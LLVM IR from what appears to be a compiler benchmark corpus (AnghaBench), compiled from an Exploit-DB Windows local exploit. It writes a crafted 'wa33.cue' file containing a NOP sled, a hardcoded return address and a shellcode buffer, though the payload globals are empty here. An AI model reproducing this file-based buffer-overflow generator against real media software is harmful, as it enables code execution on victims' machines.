; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_8138.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_8138.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [54 x i8] c"Coded By Assad edin (Sat0rA-Cr3w - Moroccan Hackers)\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"Email : storms0uth@hotmail.com\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"wa33.cue\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"Canot open file\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@NOP = common dso_local global i32* null, align 8
@scode = common dso_local global i32* null, align 8
@header1 = common dso_local global i8* null, align 8
@header2 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 2088986976, i32* %8, align 4
  store i32 0, i32* %9, align 4
  %10 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0))
  %12 = call i32* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  store i32* %12, i32** %6, align 8
  %13 = icmp eq i32* %12, null
  br i1 %13, label %14, label %16

14:                                               ; preds = %2
  %15 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0))
  br label %16

16:                                               ; preds = %14, %2
  %17 = load i32, i32* @OFFSET, align 4
  %18 = add nsw i32 %17, 4
  %19 = load i32*, i32** @NOP, align 8
  %20 = call i32 @strlen(i32* %19)
  %21 = add nsw i32 %18, %20
  %22 = load i32*, i32** @scode, align 8
  %23 = call i32 @strlen(i32* %22)
  %24 = add nsw i32 %21, %23
  %25 = call i64 @malloc(i32 %24)
  %26 = inttoptr i64 %25 to i8*
  store i8* %26, i8** %7, align 8
  %27 = load i8*, i8** %7, align 8
  %28 = load i32, i32* @OFFSET, align 4
  %29 = add nsw i32 %28, 4
  %30 = load i32*, i32** @NOP, align 8
  %31 = call i32 @strlen(i32* %30)
  %32 = add nsw i32 %29, %31
  %33 = load i32*, i32** @scode, align 8
  %34 = call i32 @strlen(i32* %33)
  %35 = add nsw i32 %32, %34
  %36 = call i32 @memset(i8* %27, i32 144, i32 %35)
  %37 = load i32, i32* @OFFSET, align 4
  store i32 %37, i32* %9, align 4
  %38 = load i8*, i8** %7, align 8
  %39 = load i32, i32* %9, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = call i32 @memcpy(i8* %41, i32* %8, i32 4)
  %43 = load i32, i32* %9, align 4
  %44 = add nsw i32 %43, 4
  store i32 %44, i32* %9, align 4
  %45 = load i8*, i8** %7, align 8
  %46 = load i32, i32* %9, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = load i32*, i32** @NOP, align 8
  %50 = load i32*, i32** @NOP, align 8
  %51 = call i32 @strlen(i32* %50)
  %52 = call i32 @memcpy(i8* %48, i32* %49, i32 %51)
  %53 = load i32*, i32** @NOP, align 8
  %54 = call i32 @strlen(i32* %53)
  %55 = load i32, i32* %9, align 4
  %56 = add nsw i32 %55, %54
  store i32 %56, i32* %9, align 4
  %57 = load i8*, i8** %7, align 8
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i32*, i32** @scode, align 8
  %62 = load i32*, i32** @scode, align 8
  %63 = call i32 @strlen(i32* %62)
  %64 = call i32 @memcpy(i8* %60, i32* %61, i32 %63)
  %65 = load i32*, i32** @scode, align 8
  %66 = call i32 @strlen(i32* %65)
  %67 = load i32, i32* %9, align 4
  %68 = add nsw i32 %67, %66
  store i32 %68, i32* %9, align 4
  %69 = load i8*, i8** @header1, align 8
  %70 = load i32*, i32** %6, align 8
  %71 = call i32 @fputs(i8* %69, i32* %70)
  %72 = load i8*, i8** %7, align 8
  %73 = load i32*, i32** %6, align 8
  %74 = call i32 @fputs(i8* %72, i32* %73)
  %75 = load i8*, i8** @header2, align 8
  %76 = load i32*, i32** %6, align 8
  %77 = call i32 @fputs(i8* %75, i32* %76)
  %78 = load i32*, i32** %6, align 8
  %79 = call i32 @fclose(i32* %78)
  %80 = load i8*, i8** %7, align 8
  %81 = call i32 @free(i8* %80)
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @fputs(i8*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
